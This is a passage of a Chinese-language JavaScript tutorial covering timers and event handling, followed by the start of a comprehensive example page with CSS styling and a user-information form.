<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// setInterval</span></span><br><span class="line"><span class="keyword">var</span> intervalId = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> time = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toLocaleTimeString</span>();</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;clock&quot;</span>).<span class="property">value</span> = time;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 停止定时器</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stopClock</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(intervalId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// setTimeout</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showNotification</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;notification&quot;</span>).<span class="property">innerText</span> = <span class="string">&quot;操作成功！&quot;</span>;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;notification&quot;</span>).<span class="property">innerText</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;, <span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 递归setTimeout（比setInterval更精确）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">animate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 动画逻辑</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;动画帧&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 递归调用</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(animate, <span class="number">1000</span>/<span class="number">60</span>); <span class="comment">// 60fps</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">animate</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除定时器</span></span><br><span class="line"><span class="keyword">var</span> timerId;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">startTimer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    timerId = <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;定时器触发&quot;</span>);</span><br><span class="line">    &#125;, <span class="number">2000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">cancelTimer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">clearTimeout</span>(timerId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：倒计时</span></span><br><span class="line"><span class="keyword">var</span> countdown = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> countdownId = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;countdown&quot;</span>).<span class="property">innerText</span> = countdown;</span><br><span class="line">    countdown--;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (countdown &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">clearInterval</span>(countdownId);</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;countdown&quot;</span>).<span class="property">innerText</span> = <span class="string">&quot;时间到！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>

<h3 id="19-9-事件处理"><a href="#19-9-事件处理" class="headerlink" title="19.9 事件处理"></a>19.9 事件处理</h3><h4 id="19-9-1-事件绑定"><a href="#19-9-1-事件绑定" class="headerlink" title="19.9.1 事件绑定"></a>19.9.1 事件绑定</h4><p><strong>详细解释：</strong></p>
<ul>
<li><strong>行内绑定</strong>：直接在HTML标签中添加事件属性</li>
<li><strong>脚本绑定</strong>：通过JavaScript代码绑定事件</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 行内绑定（在HTML中）</span></span><br><span class="line"><span class="comment">// &lt;button onclick=&quot;handleClick()&quot;&gt;点击我&lt;/button&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 脚本绑定</span></span><br><span class="line"><span class="keyword">var</span> button = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myButton&quot;</span>);</span><br><span class="line">button.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;按钮被点击&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用addEventListener（推荐）</span></span><br><span class="line">button.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;使用addEventListener绑定&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：多种事件</span></span><br><span class="line"><span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myInput&quot;</span>);</span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">&quot;focus&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">borderColor</span> = <span class="string">&quot;blue&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">&quot;blur&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">style</span>.<span class="property">borderColor</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">&quot;keyup&quot;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;按键: &quot;</span> + event.<span class="property">key</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：事件委托</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;list&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (event.<span class="property">target</span>.<span class="property">tagName</span> === <span class="string">&quot;LI&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;点击了列表项: &quot;</span> + event.<span class="property">target</span>.<span class="property">textContent</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：移除事件监听器</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleClick</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;按钮被点击&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">button.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, handleClick);</span><br><span class="line"><span class="comment">// 之后可以移除</span></span><br><span class="line">button.<span class="title function_">removeEventListener</span>(<span class="string">&quot;click&quot;</span>, handleClick);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：事件对象</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;keydown&quot;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;按键代码: &quot;</span> + event.<span class="property">keyCode</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;按键字符: &quot;</span> + event.<span class="property">key</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (event.<span class="property">key</span> === <span class="string">&quot;Enter&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;按下了回车键&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 阻止默认行为</span></span><br><span class="line">    <span class="keyword">if</span> (event.<span class="property">key</span> === <span class="string">&quot; &quot;</span>) &#123;</span><br><span class="line">        event.<span class="title function_">preventDefault</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="综合大例子"><a href="#综合大例子" class="headerlink" title="综合大例子"></a>综合大例子</h2><p>以下是一个包含所有知识点的综合性示例，展示如何将JavaScript基础知识应用于实际项目：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JavaScript综合示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        * &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-sizing</span>: border-box;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&quot;Microsoft YaHei&quot;</span>, sans-serif;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to right, <span class="number">#f5f7fa</span>, <span class="number">#e4edf5</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">1.6</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">header</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#2c3e50</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">4px</span> <span class="number">12px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">2.5rem</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.description</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">1.2rem</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">800px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">opacity</span>: <span class="number">0.9</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.card</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">8px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: transform <span class="number">0.3s</span> ease;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.card</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">5px</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h2</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#2c3e50</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding-bottom</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">label</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">input</span>, <span class="selector-tag">select</span>, <span class="selector-tag">textarea</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">button</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#3498db</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: background <span class="number">0.3s</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">button</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#2980b9</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.button-group</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">gap</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.output</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f8f9fa</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">min-height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.user-card</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f8f9fa</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.user-avatar</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#3498db</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-right</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.timer-display</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">2rem</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#2c3e50</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.notification</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: fixed;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">right</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#27ae60</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">15px</span> <span class="number">25px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">10px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.2</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">120%</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transition</span>: transform <span class="number">0.3s</span> ease;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">1000</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.notification</span><span class="selector-class">.show</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">transform</span>: <span class="built_in">translateX</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.code-block</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#2d2d2d</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#f8f8f2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: monospace;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow-x</span>: auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">15px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.highlight</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#fffde7</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">2px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        </span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">footer</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#7f8c8d</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="number">#eee</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>JavaScript综合示例<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;description&quot;</span>&gt;</span>本示例展示了JavaScript基础知识点的应用，包括变量、函数、DOM操作、事件处理等<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>1. 用户信息表单<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;userForm&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名 (5-20个字符)<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;email&quot;</span>&gt;</span>邮箱<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;age&quot;</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">id</span>=<span class="string">&quot;age&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">min</span>=<span class="string">&quot;18&quot;</span> <span class="attr">max</span>=<span class="string">&quot;100&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;country&quot;</span>&gt;</span>国家<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;country&quot;</span> <span 